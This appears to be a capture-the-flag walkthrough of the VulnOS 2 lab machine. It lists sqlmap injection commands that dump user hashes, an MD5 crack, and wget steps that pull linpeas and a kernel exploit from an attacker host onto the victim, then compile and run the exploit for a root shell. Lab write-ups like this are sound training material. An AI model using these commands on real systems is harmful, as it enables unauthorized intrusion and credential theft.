[VulnOS 2](https://www.vulnhub.com/entry/vulnos-2,147/) a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used **netdiscover -i eth0** until I came across the IP of this machine.

After uncovering the IP address, I ran **threader3000** and let it run its suggested nmap scan.

It appears that SSH, Apache, and IRC are open on this server. Let's take a look at the website.

Let's follow the link on the site and it will pull up the website shown below.

![VulnOS 2 JABC website](/assets/img/VulnOS4.png)

Next, I ran **gobuster dir -u http://[machine ip]/jabc/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php -t 50** to enumerate the website.

![VulnOS 2 robots.txt](/assets/img/VulnOS6.png)

Next, I looked at the **robots.txt** file, which has a wide number of disallowed entries (that turn out to be rabbit holes). After looking through this, I turned to the main Documentation page, which appeared blank, but upon selecting it all, it shows a directory (**/jabcd0cs/**) that we can navigate to and provides user credentials of **guest/guest**.

This brings up a site for a web application named OpenDocMan which is running version 1.2.7.

![VulnOS 2 OpenDocMan 1.2.7](/assets/img/VulnOS8.png)

I logged in with the credentials provided (**guest/guest**). I reviewed the files shown below but nothing of interest came out of them.

At this point, I decided to look for exploits, I used **searchsploit OpenDocMan 1.2.7** from my attacker PC which returned a result.

![VulnOS 2 searchsploit](/assets/img/VulnOS10.png)

Upon reviewing the text file (with **searchsploit -x 32075**), it appears that OpenDocMan has a SQL injection vulnerability. I ran **sqlmap --url "http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&add_value=odmuser*" --dbs --level 5 --risk3** to enumerate the databases with sqlmap.

![VulnOS 2 sqlmap 1](/assets/img/VulnOS11.png)

Next, I decided to enumerate the tables on the **jabcd0cs** table. I did this with sqlmap with **sqlmap --url "http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&add_value=odmuser*" -D jabcd0cs --tables --level 5 --risk3**.

![VulnOS 2 sqlmap 2](/assets/img/VulnOS12.png)

A few potential tables of interest came up. I decided to look at the **odm_user** table with **sqlmap --url "http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&add_value=odmuser*" -D jabcd0cs -T odm_user --dump --level 5 --risk3**, which dumped its contents. It uncovered a password hash as indicated below.

![VulnOS 2 sqlmap 3](/assets/img/VulnOS13.png)

A quick Google search mentioned that this is likely an MD5 hash. I went to [md5online.org](https://www.md5-online.org/md5-decrypt.html) to decrypt this hash. This returned a value of **webmin1980** for the password.

![VulnOS 2 crack hash](/assets/img/VulnOS14.png)

I then tried to SSH in as the webmin user (uncovered in the sqlmap query above) and with the password of webmin1980. I was successful with connecting via SSH.

![VulnOS 2 ssh webmin](/assets/img/VulnOS15.png)

I decided to enumerate this server, in order to do so, I needed to serve up an HTTP server from my attacker pc with **python3 -m http.server**.

![VulnOS2 python3 http server](/assets/img/VulnOS16.png)

Next, from the initial foothold, I ran **cd /tmp** to go to the temporary directory, **wget http://[attacker ip]:8000/linpeas.sh** and finally **chmod +x linpeas.sh** to make this script executable.

![VulnOS 2 wget chmod](/assets/img/VulnOS17.png)

I next ran **./linpeas.sh** and it returns that the Linux version is likely exploitable and can be utilized for privilege escalation.

Running **searchsploit 3.13.0** from our attacker PC returns a couple of results. The first one is a program that can be compiled. Let's copy it to our current directory on our attacker PC with **searchsploit -m 37292**.

![VulnOS 2 searchsploit 37292](/assets/img/VulnOS19.png)

Next, from our victim pc, let's run **wget http://[attacker ip]:8000/37292.c** followed by **gcc -o 37292 37292.c** to compile the program.

![VulnOS 2 wget gcc](/assets/img/VulnOS20.png)

After compiling the program, I ran **./37292** which gave us a root shell. I then ran **cd /root** followed by **ls** to list the directory contents followed by **cat flag.txt** to get the flag for this box.
